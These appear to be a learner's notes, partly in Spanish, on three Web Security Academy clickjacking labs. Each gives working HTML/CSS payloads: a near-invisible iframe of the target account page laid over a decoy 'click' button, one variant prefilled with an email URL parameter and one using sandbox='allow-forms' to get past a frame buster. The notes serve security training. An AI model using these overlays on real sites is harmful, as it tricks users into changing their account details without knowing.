
## Lab: Basic clickjacking with CSRF token protection

Send a web with this code to the victim: 
```html
<head>
    <style>
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 1000px;
            height: 800px;
            opacity: 0.001;
            z-index: 2;
        }
        #decoy {
            position: absolute;
            top: 400;
            left: -170;
            width: 500px;
            height: 300px;
            z-index: 1;
            text-align: center;
            padding-top: 100px;
        }
        button {
        background-color: red;
        width: 180px;
        height: 40px;
}
    </style>
</head>

<body>
    <iframe src="https://0a2f00b904c7c17680e70dd0007e0061.web-security-academy.net/my-account"></iframe>

    <div id="decoy">
        <button>click</button>
    </div>
</body>
```

## Lab: Clickjacking with form input data prefilled from a URL parameter

```
https://0a2e002604af840e807bb299002300c4.web-security-academy.net/my-account?email=final@test.com
```

## Lab: Clickjacking with a frame buster script

La pagina victima tenia que estar arriba para bypassear el frame buster 
```html
<head>
    <style>
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 1000px;
            height: 800px;
            opacity: 0.001;
            z-index: 3;
        }
        #decoy {
            position: absolute;
            top: 350;
            left: -130;
            width: 500px;
            height: 300px;
            z-index: 1;
            text-align: center;
            padding-top: 100px;
        }
        button {
        background-color: red;
        width: 180px;
        height: 40px;
}
    </style>
</head>

<body>
    <iframe src="https://0a8300450495d4809ebdba3b005600bf.web-security-academy.net/my-account?email=final@test.com" sandbox="allow-forms" ></iframe>

    <div id="decoy">
        <button>click</button>
    </div>
</body>
```

#